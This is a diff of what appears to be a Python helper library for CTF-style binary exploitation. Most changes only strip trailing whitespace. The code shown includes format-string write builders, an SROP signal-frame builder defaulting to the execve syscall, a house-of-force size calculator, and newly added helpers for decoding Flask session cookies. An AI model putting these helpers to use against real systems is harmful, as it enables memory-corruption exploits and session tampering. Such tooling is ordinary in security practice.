@@ -41,7 +41,7 @@ def inter(sock):
 def fmtchar(prev_word,word,index,byte = 1):
     fmt = ""
     if word - prev_word > 0 :
-        result = word - prev_word 
+        result = word - prev_word
         fmt += "%" + str(result) + "c"
     elif word == prev_word :
         result = 0
@@ -75,7 +75,7 @@ def fmtchain(sock,ptrindex,addrindex,addr,val,recpat,byte = 1):
         sendline(sock,payload)
 
 def xorstr(a,b):
-    return ''.join(chr(ord(x)^ord(y)) for x,y in zip(a,b)) 
+    return ''.join(chr(ord(x)^ord(y)) for x,y in zip(a,b))
 
 def search(data,pat):
     match = re.search(pat,data)
@@ -120,24 +120,24 @@ def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0)
     ucontext += pack(uc_flags)
     ucontext += pack(uc_link)
     ucontext += pack(ss_sp)
-    ucontext += pack(ss_flags)   
-    ucontext += pack(ss_size)    
-    ucontext += pack(r8)    
-    ucontext += pack(r9)    
-    ucontext += pack(r10)    
-    ucontext += pack(r11)    
-    ucontext += pack(r12)    
-    ucontext += pack(r13)    
-    ucontext += pack(r14)    
-    ucontext += pack(r15)    
-    ucontext += pack(rdi)    
-    ucontext += pack(rsi)    
-    ucontext += pack(rbp)    
-    ucontext += pack(rbx)    
-    ucontext += pack(rdx)    
-    ucontext += pack(rax)    
-    ucontext += pack(rcx)    
-    ucontext += pack(rsp)    
+    ucontext += pack(ss_flags)
+    ucontext += pack(ss_size)
+    ucontext += pack(r8)
+    ucontext += pack(r9)
+    ucontext += pack(r10)
+    ucontext += pack(r11)
+    ucontext += pack(r12)
+    ucontext += pack(r13)
+    ucontext += pack(r14)
+    ucontext += pack(r15)
+    ucontext += pack(rdi)
+    ucontext += pack(rsi)
+    ucontext += pack(rbp)
+    ucontext += pack(rbx)
+    ucontext += pack(rdx)
+    ucontext += pack(rax)
+    ucontext += pack(rcx)
+    ucontext += pack(rsp)
     ucontext += pack(rip)
     ucontext += pack(eflags)
     ucontext += pack(selector)
@@ -146,9 +146,9 @@ def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0)
     ucontext += pack(oldmask)
     ucontext += pack(cr2)
     return ucontext
-   
+
 #srop 32
-#sigret 
+#sigret
 #    mov eax,0x77
 #    int 0x80
 # eip
@@ -194,4 +194,34 @@ def calc_force(targetaddr,topaddr,bits=64):
     else :
         nb = targetaddr - 8 - topaddr - 0x10
     return nb
+
+import base64
+import binascii
+import urllib
+import zlib
+from flask import json
+from itsdangerous import base64_decode, base64_encode
+
+b64d = base64.b64decode
+b64e = base64.b64encode
+ud = lambda x: urllib.unquote(x).encode('utf-8')
+ue = lambda x: urllib.quote_plus(x).encode('utf-8')
+uee = lambda x: ''.join(['%{0:02x}'.format(ord(c)) for c in x])
+hx = lambda x: binascii.hexlify(x)
+unhx = lambda x: binascii.unhexlify(x)
+true = True
+false = False
+
+def flask_decode(cookie):
+    compressed = False
+    payload = cookie
+    if payload.startswith('.'):
+        compressed = True
+        payload = payload[1:]
+    data = payload.split(".")[0]
+    data = base64_decode(data)
+    if compressed:
+        data = zlib.decompress(data)
+    return data
+
 
